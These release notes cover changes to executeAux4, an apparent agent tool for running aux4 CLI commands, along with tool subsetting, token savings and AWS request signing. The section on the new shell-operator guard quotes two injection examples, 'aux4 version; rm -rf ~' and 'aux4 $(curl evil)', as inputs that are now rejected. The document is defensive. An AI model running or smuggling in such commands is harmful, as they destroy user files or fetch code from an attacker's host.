# Release notes

## `executeAux4` takes the full command

The tool used to strip a leading `aux4`, so models had to learn an exception ("pkger, man and
which keep the prefix") rather than a rule. They generalised it wrongly in both directions —
dropping the prefix everywhere, or adding it everywhere, turning `aux4 email --help` into
`aux4 aux4 email --help`.

Commands are now written exactly as typed in a terminal, including the leading `aux4`. Since
`aux4 X` reads as "auxiliary for X", `aux4 aux4 pkger` needs no special rule. The stripped form
still works.

Measured on a 36-task eval driving a local 4B model: this took it from 3.0/5 to 4.8/5 on the
earlier suite, and removed the run-to-run variance.

## `executeAux4` runs only aux4 commands

Commands execute through `sh -c`, so shell operators could previously chain any binary
(`aux4 version; rm -rf ~`) or substitute one (`aux4 $(curl evil)`). Those are now rejected
before execution: one aux4 command per call, no `;` `&&` `||` `|` `` ` `` `$()` or redirects.

## `--tools` binds a subset of tools

All 14 tool descriptions were sent on every request whether or not a tool was used. `--tools
executeAux4` binds only what a task needs, taking the per-request floor from ~12,200 tokens to
~700.

## Tool documentation moved behind `readReference`

Each tool description now keeps inline only what is needed to call it correctly — what it does,
the rules that change the outcome, its parameters and what it returns — with the detail in
`instructions/references/<tool>.md`, fetched on demand. Nothing is lost.

The all-tools floor drops from ~12,200 to ~3,400 tokens per request.

## `awsSigv4` for AWS OpenAI-compatible endpoints

`type: openai` with `config.awsSigv4: { region, service }` signs requests using the standard AWS
credential chain, so an endpoint such as Bedrock's OpenAI-compatible API needs no API key minted
or stored.

## Also

- `readReference` resolves the configured references directory first, then the built-in one
  shipped with the package, so internal tool references work without passing `--references`.
- New tests: `file-tools.test.md` asserts the file tools' effect on disk, and
  `execute-aux4-guard.test.md` pins the shell-operator rejection.
